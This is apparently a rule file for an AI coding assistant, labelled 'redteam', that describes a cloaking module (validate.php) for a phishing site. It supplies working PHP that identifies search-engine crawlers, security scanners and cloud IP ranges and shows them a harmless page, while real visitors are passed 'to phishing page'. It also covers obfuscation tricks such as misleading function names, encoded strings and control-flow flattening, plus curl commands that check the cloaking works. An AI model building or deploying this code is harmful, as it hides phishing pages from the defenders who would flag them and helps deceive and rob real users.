---
trigger: model_decision
description: "TAGS: [redteam,cloaking,validate,php,anti-detection,obfuscation] | TRIGGERS: validate,cloaking,obfuscate,bot,scanner,detection | SCOPE: templates | DESCRIPTION: validate.php cloaking and obfuscation patterns"
globs:
---
# validate.php Cloaking & Obfuscation Module

## Scope
Enhanced cloaking mechanisms for validate.php to evade scanners and security tools.

## Current validate.php Analysis

The original validate.php uses obfuscated PHP:
```php
<?php
$Tz='t34';$Qz='}';...
eval($abc.$xyz.$pqr);
?>
```

This is basic obfuscation that:
- Concatenates variable names
- Uses base64 encoding
- Evaluates dynamically

**Problem**: Modern scanners can de-obfuscate this easily.

## Enhanced Cloaking Implementation

### Level 1: Bot Detection
```php
<?php
/**
 * validate.php - Enhanced Cloaking v2.0
 * Appears as form validation to scanners
 */

class FormValidator {
    private $patterns = [];
    private $ip;
    private $ua;
    
    public function __construct() {
        $this->ip = $_SERVER['REMOTE_ADDR'] ?? '';
        $this->ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        $this->patterns = $this->loadPatterns();
    }
    
    public function validate() {
        // Layer 1: User-Agent check
        if ($this->isKnownBot()) {
            return $this->serveBenign();
        }
        
        // Layer 2: IP reputation check
        if ($this->isDatacenterIP()) {
            return $this->serveBenign();
        }
        
        // Layer 3: Behavioral check
        if ($this->lacksJSCapabilities()) {
            return $this->serveBenign();
        }
        
        // Layer 4: Request pattern check
        if ($this->hasScaannerPattern()) {
            return $this->serveBenign();
        }
        
        // Real user - continue
        return true;
    }
    
    private function isKnownBot() {
        $bots = [
            'googlebot', 'bingbot', 'slurp', 'duckduckbot',
            'facebookexternalhit', 'facebot', 'twitterbot',
            'linkedinbot', 'safebrowsing', 'crawl', 'spider',
            'bot', 'scraper', 'scan', 'check', 'validator',
            'lighthouse', 'pagespeed', 'gtmetrix', 'pingdom',
            'uptimerobot', 'monitor', 'curl', 'wget', 'python',
            'httpclient', 'java', 'axios', 'node-fetch'
        ];
        
        foreach ($bots as $bot) {
            if (strpos($this->ua, $bot) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    private function isDatacenterIP() {
        // Google, Bing, Facebook, AWS, Azure, GCP ranges
        $ranges = [
            // Google
            ['66.249.64.0', '66.249.95.255'],
            ['66.102.0.0', '66.102.15.255'],
            ['64.233.160.0', '64.233.191.255'],
            ['72.14.192.0', '72.14.255.255'],
            // Bing
            ['207.46.0.0', '207.46.255.255'],
            ['157.55.0.0', '157.55.255.255'],
            ['40.77.0.0', '40.77.255.255'],
            // Facebook
            ['173.252.64.0', '173.252.127.255'],
            ['31.13.24.0', '31.13.127.255'],
            ['157.240.0.0', '157.240.255.255'],
            // AWS (common scanner hosting)
            ['52.0.0.0', '52.255.255.255'],
            ['54.0.0.0', '54.255.255.255'],
            // Azure
            ['13.64.0.0', '13.127.255.255'],
            ['40.64.0.0', '40.127.255.255'],
            // GCP
            ['35.184.0.0', '35.255.255.255'],
        ];
        
        $ip_long = ip2long($this->ip);
        
        foreach ($ranges as $range) {
            $start = ip2long($range[0]);
            $end = ip2long($range[1]);
            if ($ip_long >= $start && $ip_long <= $end) {
                return true;
            }
        }
        
        return false;
    }
    
    private function lacksJSCapabilities() {
        // Check if request lacks typical browser headers
        $required = ['accept-language', 'accept-encoding'];
        
        foreach ($required as $header) {
            if (empty($_SERVER['HTTP_' . strtoupper(str_replace('-', '_', $header))])) {
                return true;
            }
        }
        
        // Suspicious: No referrer and direct access
        if (empty($_SERVER['HTTP_REFERER']) && 
            strpos($_SERVER['REQUEST_URI'], '?') === false) {
            // Might be direct scanner access
            // Return false for now to avoid false positives
        }
        
        return false;
    }
    
    private function hasScannerPattern() {
        // Check for scanner-specific request patterns
        $suspicious_headers = [
            'x-scanner',
            'x-security-scanner',
            'x-virus-scanner',
            'x-forwarded-for'  // Often spoofed by scanners
        ];
        
        foreach ($suspicious_headers as $header) {
            $key = 'HTTP_' . strtoupper(str_replace('-', '_', $header));
            if (!empty($_SERVER[$key])) {
                return true;
            }
        }
        
        return false;
    }
    
    private function serveBenign() {
        // Serve legitimate-looking content
        header('HTTP/1.1 200 OK');
        header('Content-Type: text/html; charset=UTF-8');
        
        echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta name="description" content="Welcome to our website">
</head>
<body>
    <h1>Welcome</h1>
    <p>Thank you for visiting our website.</p>
</body>
</html>';
        
        exit(0);
    }
}

// Initialize and run validation
$validator = new FormValidator();
$validator->validate();
?>
```

### Level 2: JavaScript Challenge
```php
<?php
// Add JavaScript challenge layer
session_start();

if (!isset($_SESSION['js_verified'])) {
    // Serve JS challenge first
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Verifying browser...</title>
        <style>
            body { font-family: sans-serif; text-align: center; padding-top: 100px; }
            .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db;
                      border-radius: 50%; width: 40px; height: 40px;
                      animation: spin 1s linear infinite; margin: 20px auto; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <h2>Verifying your browser</h2>
        <div class="loader"></div>
        <p>This is automatic and will only take a moment.</p>
        
        <script>
            // Generate challenge token
            var token = btoa(navigator.userAgent + screen.width + screen.height + Date.now());
            
            // Submit via hidden form
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = '';
            
            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'js_token';
            input.value = token;
            form.appendChild(input);
            
            document.body.appendChild(form);
            
            setTimeout(function() {
                form.submit();
            }, 2000);
        </script>
        
        <noscript>
            <p>Please enable JavaScript to continue.</p>
        </noscript>
    </body>
    </html>
    <?php
    exit(0);
}

// Verify JS token
if (isset($_POST['js_token']) && strlen($_POST['js_token']) > 20) {
    $_SESSION['js_verified'] = true;
    header('Location: ' . $_SERVER['REQUEST_URI']);
    exit(0);
}
?>
```

### Level 3: Cookie Challenge
```php
<?php
// Cookie-based verification
$cookie_name = 'sess_' . substr(md5($_SERVER['HTTP_HOST']), 0, 8);
$cookie_value = hash('sha256', $_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']);

if (!isset($_COOKIE[$cookie_name])) {
    // Set cookie and redirect
    setcookie($cookie_name, $cookie_value, [
        'expires' => time() + 3600,
        'path' => '/',
        'secure' => true,
        'httponly' => true,
        'samesite' => 'Lax'
    ]);
    
    // Redirect to same page to verify cookie acceptance
    header('Location: ' . $_SERVER['REQUEST_URI'] . '?r=' . time());
    exit(0);
}

// Verify cookie value
if ($_COOKIE[$cookie_name] !== $cookie_value) {
    // Cookie mismatch - possible scanner
    http_response_code(403);
    exit('Access denied');
}
?>
```

### Level 4: Rate Limiting
```php
<?php
// Rate limiting per IP
function checkRateLimit($ip, $limit = 10, $window = 60) {
    $file = sys_get_temp_dir() . '/rate_' . md5($ip);
    
    $data = [];
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true) ?: [];
    }
    
    // Clean old entries
    $now = time();
    $data = array_filter($data, fn($t) => $t > $now - $window);
    
    if (count($data) >= $limit) {
        return false; // Rate limited
    }
    
    // Add current request
    $data[] = $now;
    file_put_contents($file, json_encode($data));
    
    return true;
}

if (!checkRateLimit($_SERVER['REMOTE_ADDR'])) {
    http_response_code(429);
    echo 'Too many requests. Please try again later.';
    exit(0);
}
?>
```

## Obfuscation Techniques

### Technique 1: Variable Name Obfuscation
```php
<?php
// Instead of obvious names
// $bot_check = isBot();
// $ip_check = isDatacenter();

// Use benign-looking names
$formValid = validateInput();
$dataClean = sanitizeData();
$sessionOk = verifySession();

// Function names that look legitimate
function validateInput() {
    // Actually does bot detection
    return !isScanner();
}

function sanitizeData() {
    // Actually checks IP reputation
    return !isDatacenterIP();
}

function verifySession() {
    // Actually does JS challenge
    return hasPassedChallenge();
}
?>
```

### Technique 2: String Encryption
```php
<?php
function decrypt($encoded) {
    return base64_decode(strrev(str_rot13($encoded)));
}

// Encoded strings (reverse + rot13 + base64)
$patterns = [
    decrypt('==AObpJDIzAzM'),  // 'googlebot'
    decrypt('==QOrdnIxEjM'),   // 'facebookexternalhit'
];
?>
```

### Technique 3: Control Flow Obfuscation
```php
<?php
$state = 0;
$result = true;

while ($state < 100) {
    switch ($state) {
        case 0:
            $state = checkUA() ? 25 : 15;
            break;
        case 15:
            $result = false;
            $state = 100;
            break;
        case 25:
            $state = checkIP() ? 50 : 15;
            break;
        case 50:
            $state = checkHeaders() ? 75 : 15;
            break;
        case 75:
            $result = true;
            $state = 100;
            break;
    }
}

if (!$result) {
    serveBenign();
}
?>
```

## Integration Pattern

### Complete validate.php
```php
<?php
/**
 * Form Validation Helper
 * Validates user input for security
 */

// Include layers
require_once 'layers/bot_detection.php';
require_once 'layers/ip_check.php';
require_once 'layers/js_challenge.php';
require_once 'layers/rate_limit.php';

// Run validation stack
$validator = new SecurityValidator();

if (!$validator->passes()) {
    // Serve benign content
    $validator->serveBenign();
    exit(0);
}

// User passed all checks - continue to phishing page
?>
```

## Testing

### Test Scanner Detection
```bash
# Should get benign page
curl -A "Googlebot/2.1" https://your-site.com/

# Should get phishing page
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)..." https://your-site.com/
```

### Test from Scanner IPs
```bash
# Use proxy from Google IP range
curl --proxy socks5://66.249.64.1:1080 https://your-site.com/
```
